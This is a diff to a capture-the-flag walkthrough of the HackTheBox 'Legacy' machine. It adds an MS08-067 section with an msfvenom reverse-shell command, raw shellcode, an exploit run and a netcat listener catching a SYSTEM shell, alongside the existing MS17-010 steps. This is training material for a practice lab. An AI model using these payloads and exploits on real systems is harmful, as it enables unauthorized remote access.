@@ -1,6 +1,6 @@
 # Hackthebox Legacy
 
-Reset the machinei just in case.
+Reset the machine just in case.
 
 ## Enumeration
 
@@ -80,7 +80,7 @@ Looking up status of 10.10.10.4
 	HTB             <1d> -         B <ACTIVE> 
 	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
 
-$ enum4linux -U 10.10.10.4                                                                                                                1 ⨯
+$ enum4linux -U 10.10.10.4 
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct  7 13:02:55 2021
 
  ========================== 
@@ -168,17 +168,15 @@ Indeed, MS08-067 and MS17-010 (Eternal Blue) are found.
 
 ### Samba
 
-#### MS08-067
-
-TODO
-
 #### MS17-010 (Eternal Blue)
 
-Credit to https://github.com/helviojunior/MS17-010
+Credit to https://github.com/helviojunior/MS17-010 (python2)
 
 Install Python 2.7.18 using pyenv
 pyenv installer: https://github.com/pyenv/pyenv-installer
+
 Kali instructions to use EOL python versions: https://www.kali.org/docs/general-use/using-eol-python-versions/
+
 pyenv tutorial for the basic commands: https://amaral.northwestern.edu/resources/guides/pyenv-tutorial
 
 Once the python virtual environment is created and the virtual python binary is found from the PATH
@@ -200,7 +198,7 @@ listening on [any] 443 ...
 
 Execute the script
 ```
-$ python send_and_execute.py 10.10.10.4 rev_10.10.14.18_443.exe                                                                                       2 ⨯
+$ python send_and_execute.py 10.10.10.4 rev_10.10.14.18_443.exe 
 Trying to connect to 10.10.10.4:445
 Target OS: Windows 5.1
 Using named pipe: browser
@@ -288,6 +286,87 @@ dir
                2 Dir(s)   6.400.626.688 bytes free
 ```
 
+#### MS08-067
+
+Credit to https://github.com/areyou1or0/OSCP/blob/master/Scripts%20-%20MS08-067 (python2)
+
+Generate payload:
+```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of c file: 1488 bytes
+unsigned char buf[] = 
+"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
+"\xae\x91\xdb\xef\x83\xee\xfc\xe2\xf4\x52\x79\x59\xef\xae\x91"
+"\xbb\x66\x4b\xa0\x1b\x8b\x25\xc1\xeb\x64\xfc\x9d\x50\xbd\xba"
+"\x1a\xa9\xc7\xa1\x26\x91\xc9\x9f\x6e\x77\xd3\xcf\xed\xd9\xc3"
+"\x8e\x50\x14\xe2\xaf\x56\x39\x1d\xfc\xc6\x50\xbd\xbe\x1a\x91"
+"\xd3\x25\xdd\xca\x97\x4d\xd9\xda\x3e\xff\x1a\x82\xcf\xaf\x42"
+"\x50\xa6\xb6\x72\xe1\xa6\x25\xa5\x50\xee\x78\xa0\x24\x43\x6f"
+"\x5e\xd6\xee\x69\xa9\x3b\x9a\x58\x92\xa6\x17\x95\xec\xff\x9a"
+"\x4a\xc9\x50\xb7\x8a\x90\x08\x89\x25\x9d\x90\x64\xf6\x8d\xda"
+"\x3c\x25\x95\x50\xee\x7e\x18\x9f\xcb\x8a\xca\x80\x8e\xf7\xcb"
+"\x8a\x10\x4e\xce\x84\xb5\x25\x83\x30\x62\xf3\xf9\xe8\xdd\xae"
+"\x91\xb3\x98\xdd\xa3\x84\xbb\xc6\xdd\xac\xc9\xa9\x6e\x0e\x57"
+"\x3e\x90\xdb\xef\x87\x55\x8f\xbf\xc6\xb8\x5b\x84\xae\x6e\x0e"
+"\xbf\xfe\xc1\x8b\xaf\xfe\xd1\x8b\x87\x44\x9e\x04\x0f\x51\x44"
+"\x4c\x85\xab\xf9\xd1\xe5\xa0\x84\xb3\xed\xae\x90\x60\x66\x48"
+"\xfb\xcb\xb9\xf9\xf9\x42\x4a\xda\xf0\x24\x3a\x2b\x51\xaf\xe3"
+"\x51\xdf\xd3\x9a\x42\xf9\x2b\x5a\x0c\xc7\x24\x3a\xc6\xf2\xb6"
+"\x8b\xae\x18\x38\xb8\xf9\xc6\xea\x19\xc4\x83\x82\xb9\x4c\x6c"
+"\xbd\x28\xea\xb5\xe7\xee\xaf\x1c\x9f\xcb\xbe\x57\xdb\xab\xfa"
+"\xc1\x8d\xb9\xf8\xd7\x8d\xa1\xf8\xc7\x88\xb9\xc6\xe8\x17\xd0"
+"\x28\x6e\x0e\x66\x4e\xdf\x8d\xa9\x51\xa1\xb3\xe7\x29\x8c\xbb"
+"\x10\x7b\x2a\x3b\xf2\x84\x9b\xb3\x49\x3b\x2c\x46\x10\x7b\xad"
+"\xdd\x93\xa4\x11\x20\x0f\xdb\x94\x60\xa8\xbd\xe3\xb4\x85\xae"
+"\xc2\x24\x3a";
+```
+
+Insert the payload to the script and execute.
+
+```
+$ /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python ms08_067_script.py 10.10.10.4 6 445
+#######################################################################
+#   MS08-067 Exploit
+#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
+#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
+#
+#   Mod in 2018 by Andy Acer:
+#   - Added support for selecting a target port at the command line.
+#     It seemed that only 445 was previously supported.
+#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
+#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
+#     into this source file.
+#######################################################################
+
+Windows XP SP3 English (NX)
+
+[-]Initiating connection
+[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
+Exploit finish
+```
+
+And get your prompt through a listener
+
+```
+$ nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.4] 1031
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>more "C:\Documents and Settings\Administrator\Desktop\root.txt"
+more "C:\Documents and Settings\Administrator\Desktop\root.txt"
+993442d...
+```
 
 
 
